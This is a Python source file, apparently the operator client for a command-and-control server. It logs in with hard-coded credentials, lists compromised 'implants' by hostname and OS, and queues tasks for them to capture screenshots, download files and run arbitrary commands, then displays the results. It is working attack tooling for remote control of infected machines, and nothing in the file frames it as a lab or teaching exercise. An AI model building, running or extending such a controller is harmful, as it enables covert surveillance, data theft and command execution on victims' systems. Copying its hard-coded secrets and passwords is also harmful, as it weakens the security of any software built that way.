import argparse
import requests
import os
import tabulate
import json

def display_results(results):
    if not results:
        print("No results to display.")
        return
    
    # Prepare data for tabulation
    table_data = []
    headers = ["Task ID", "Implant ID","Task Type", "Options", "Result", "Timestamp"]
    
    for result in results:
        row = [
            result.get('task_id', ''),
            result.get('implant_id', ''),            
            json.loads(result.get('task_obj', '{}')).get('task_type', ''),
            json.loads(result.get('task_obj', '{}')).get('cmd', ''),
            result.get('result', ''),
            result.get('timestamp', '')   
        ]
        table_data.append(row)
    
    # Print the table
    print(tabulate.tabulate(table_data, headers=headers, tablefmt="grid"))

def display_imlants(results):
    table_data = []
    headers = ['Implant Id', 'hostname', 'OS', 'ARCH', 'os_version']
    
    for result in results:
        row = [
            result.get('implant_id',''),
            result.get('hostname', ''),
            result.get('os', ''),
            result.get('arch', ''),
            result.get('os_version', '')
        ]
        table_data.append(row)
    print(tabulate.tabulate(table_data,headers=headers,tablefmt='grid'))

def login(server_url):
    try:
        secret = "e7bcc0ba5fb1dc9cc09460baaa2a6986"  # Replace with actual secret key input
        response = requests.post(f'{server_url}/profile/login', json={"username": "enigma", "password": "pass123456"})
        response.raise_for_status()
        return response.json().get('access_token')
    except requests.exceptions.RequestException as e:
        print(f"Login failed: {e}")
        return None

def get_implants(server_url, access_token):
    try:
        headers = {'Authorization': f'Bearer {access_token}'}
        response = requests.get(f'{server_url}/implants', headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Failed to retrieve implants: {e}")
        return None

def get_results(server_url, implant_id, access_token):
    try:
        headers = {'Authorization': f'Bearer {access_token}'}
        response = requests.get(f'{server_url}/results?implant_id={implant_id}', headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Failed to retrieve results: {e}")
        return None

def post_task(server_url, implant_id, task_type,cmd, access_token):
    try:
        headers = {'Authorization': f'Bearer {access_token}'}
        response = requests.post(f'{server_url}/tasks', headers=headers, json=[{"implant_id": implant_id, "task_type": task_type, "cmd": cmd}])
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Failed to post task: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description="A Python CLI to interact with the C2-server.")
    
    parser.add_argument(
        'action',
        nargs='?',
        choices=['implants', 'add_task', 'results'],
        help='Action to perform. Currently, only "implants" is supported to get a list of registered implants.'
    )
    
    parser.add_argument(
        '--server-url',
        default=os.getenv('C2_SERVER_URL', 'http://localhost:5000'),
        help='The base URL of the C2-server API (default: http://localhost:5000).'
    )
    
    args = parser.parse_args()

    access_token = login(args.server_url)

    try:
        while True:
            if args.action == 'exit':
                print("Exiting C2 CLI.")
                break

            if not args.action:
                args.action = input("--> Welcome to C2 CLI. Please enter a command ('exit' to quit):\n>> ").strip()

            if args.action == 'implants':
                if access_token:
                    implants = get_implants(args.server_url, access_token)
                    if implants:
                        display_imlants(implants)
            elif args.action == 'add_task':
                if access_token:
                    
                    args.implant_id = input("Enter the implant ID to get tasks for:\n>> ").strip()
                    args.task_type = input("Enter the task type to get tasks for:\n>> ").strip()
                    if args.task_type == 'screenshot' or args.task_type == 'ping':
                        post_task(args.server_url, args.implant_id, args.task_type, "", access_token)
                    elif args.task_type == 'download':
                        args.file_path = input("Enter the file path to download:\n>> ").strip()
                        post_task(args.server_url, args.implant_id, args.task_type, args.file_path, access_token)
                    elif args.task_type == 'cmd':
                        args.command = input("Enter the command to run:\n>> ").strip()
                        post_task(args.server_url, args.implant_id, args.task_type, args.command, access_token)
                    
            elif args.action == 'results':
                if access_token:
                    args.implant_id = input("Enter the implant ID to get results for:\n>> ").strip()
                    results = get_results(args.server_url, args.implant_id, access_token)
                    if results:
                        display_results(results)
            else:
                if args.action != 'exit':
                    print(f"Unknown command '{args.action}'. Please enter a valid command.")
                
            args.action = None  # Reset action to prompt again if not exited
    except KeyboardInterrupt:
        print("\nExiting C2 CLI due to keyboard interrupt.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
